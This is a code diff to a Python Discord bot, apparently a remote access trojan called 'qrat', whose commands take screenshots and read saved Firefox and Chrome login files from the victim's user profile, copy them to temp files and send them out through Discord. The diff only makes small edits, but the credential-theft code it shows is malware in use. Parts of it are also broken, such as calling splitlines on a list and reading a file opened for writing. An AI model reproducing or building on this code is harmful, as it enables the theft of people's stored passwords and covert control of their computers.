@@ -8,7 +8,6 @@ import asyncio
 from datetime import datetime
 import shutil
 import sys
-import ctypes
 import subprocess
 import pyautogui
 import discord
@@ -17,7 +16,7 @@ from discord.ext import commands
 from discord import app_commands
 if not os.path.exists(os.path.dirname(__file__)+'/files/logs'):
     os.makedirs(os.path.dirname(__file__)+'/files/logs')
-#logfile = os.path.dirname(__file__)+"/files/logs/log_"+datetime.now().strftime("%Y-%m-%d_%H-%M-%S")+".log"
+logfile = os.path.dirname(__file__)+"/files/logs/log_"+datetime.now().strftime("%Y-%m-%d_%H-%M-%S")+".log"
 #sys.stdout = open(logfile, 'w')
 def nowdatetime():
     """Get current date and time for logs"""
@@ -210,7 +209,6 @@ async def screenshot(ctx):
             os.makedirs(os.path.dirname(__file__)+'/files/temp')
         except Exception as tempcrerr:
             print(f'{nowdatetime()}[SYSTEM] failed. [{tempcrerr}] (x{errors})', end='\r')
-            MessageBox(None, f'An error ocurred! Do me a favor and create an issue on the github page.\n[{tempcrerr}]', 'https://github.com/anarix0/qrat', 0)
             errors = errors + 1
     LINE_CLEAR = '\x1b[2K' # <-- ANSI sequence
     print(end=LINE_CLEAR) # <-- clear the line where cursor is located
@@ -352,9 +350,8 @@ async def getpass(ctx):
             print('tttttttttt')
             with open(firefoxfolders[0]+"/logins.json", "r") as logins:
                 passwordlist = logins.readlines()
-                with open(os.path.dirname(__file__)+f"\\files\\temp/firefoxpass.txt", "w") as tempfile:
-                    for line in passwordlist:
-                        tempfile.write(passwordlist.splitlines())
+                with open(os.path.dirname(__file__)+"\\files\\temp/firefoxpass.txt", "w") as tempfile:
+                    tempfile.write(passwordlist.splitlines())
                     passwords = tempfile.read()
                     tempfile.close()
                 embed = discord.Embed(title="Firefox Passwords File", description="```passwords```", colour=0x00b0f4)
@@ -365,11 +362,10 @@ async def getpass(ctx):
             print('fail')
     if os.path.exists(f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data"):
         print('chrome wooorororor')
-        chromefolders = os.listdir(f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data")
         try:
             with open(f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Login Data", "r") as logins:
                 passwordlist = logins.readlines()
-                with open(os.path.dirname(__file__)+f"\\files\\temp/chromepass.txt", "w") as tempfile:
+                with open(os.path.dirname(__file__)+"\\files\\temp/chromepass.txt", "w") as tempfile:
                     for line in passwordlist:
                         tempfile.write(passwordlist.splitlines())
                     passwords = tempfile.read()
